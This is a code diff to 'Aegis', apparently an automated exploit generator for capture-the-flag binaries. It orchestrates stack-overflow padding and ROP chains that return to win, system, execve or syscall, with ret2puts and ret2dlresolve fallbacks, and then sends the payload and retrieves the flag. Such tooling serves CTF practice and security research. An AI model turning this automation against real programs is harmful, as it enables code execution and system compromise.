@@ -24,7 +24,6 @@ class Aegis:
 
         self.ip = ip
         self.port = port
-
         self.has_leak = False
         self.has_overflow = False
         self.has_libc_leak = False
@@ -37,6 +36,7 @@ class Aegis:
         self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)
 
         self.symbolic_padding = None
+        self.padding = None
 
     def static_analysis(self):
         """Set variables from the output of the static analysis."""
@@ -48,7 +48,6 @@ class Aegis:
         """Set variables from the output of the symbolic analysis."""
         self.symbol.stack_smash()
         self.symbolic_padding = self.symbol.symbolic_padding
-        return None
 
     def setup_exploit(self):
         """Choose which exploit to do for the binary."""
@@ -88,24 +87,28 @@ class Aegis:
                 if self.failed:
                     self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                 self.against.chain += p64(win_gadget)
+                self.against.exploit = self.against.padding + self.against.chain
             elif function == "win":
                 aegis_log.info(f"Setting up return to win with function")
                 self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
+                self.against.exploit = self.against.padding + self.against.chain
             elif function == "system":
                 aegis_log.info(f"Setting up return to system")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string])
+                    self.against.exploit = self.against.padding + self.against.chain
             elif function == "execve":
                 aegis_log.info(f"Setting up return to execve")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
+                    self.against.exploit = self.against.padding + self.against.chain
             elif function == "syscall":
                 aegis_log.info(f"Setting up return to syscall")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
+                    self.against.exploit = self.against.padding + self.against.chain
             else:
-                print(self.machine.find_functions(["puts, printf"]))
-                if len(self.machine.find_functions(["puts, printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
+                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                     aegis_log.info(f"Setting up return to puts")
                     self.against.chain = self.against.rop_ret2puts()
                 # Check for ret2dlresolve
@@ -114,20 +117,24 @@ class Aegis:
                     self.against.chain = self.against.rop_chain_dlresolve()
                 
 
-        return None
 
     def write_solve_script(self):
         """Write the solve to a script for writeup purposes."""
-        return None
 
     def exploit(self):
         """Create and run exploit using Against module."""
-        p = self.against.start("")
-        self.against.send_exploit(p)
-        self.against.recieve_flag(p)
-        self.against.verify_flag(p)
+        aegis_log.info(f"Setting up exploit")
+        if args.GDB:
+            self.against.process = self.against.start("GDB")
+            self.against.send_exploit()
+        else:
+            self.against.process = self.against.start("")
+            self.against.send_exploit()
+            self.against.recieve_flag()
+            self.against.verify_flag()
 
-        return None
+        
+
 
 
 def print_title():
@@ -173,7 +180,28 @@ def print_title():
 
     """
 
+    pillar = """      
+    ░░▒▒▒▒░░▒▒░░░░░░     
+  ░░░░░░░░░░░░░░░░░░░░   
+  ░░░░░░░░░░▒▒░░░░░░     
+    ░░▒▒▒▒▒▒░░░░░░░░     
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░▒▒░░       
+      ▒▒▒▒▒▒░░▒▒░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+      ▒▒▒▒▒▒░░░░░░       
+    ▒▒▒▒▒▒░░░░░░░░░░     
+    ▒▒▒▒░░░░░░░░░░░░     
+    ▒▒▒▒▒▒▒▒░░░░░░░░   
+    """
     print(aegis_title)
+    print(pillar)
 
 if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
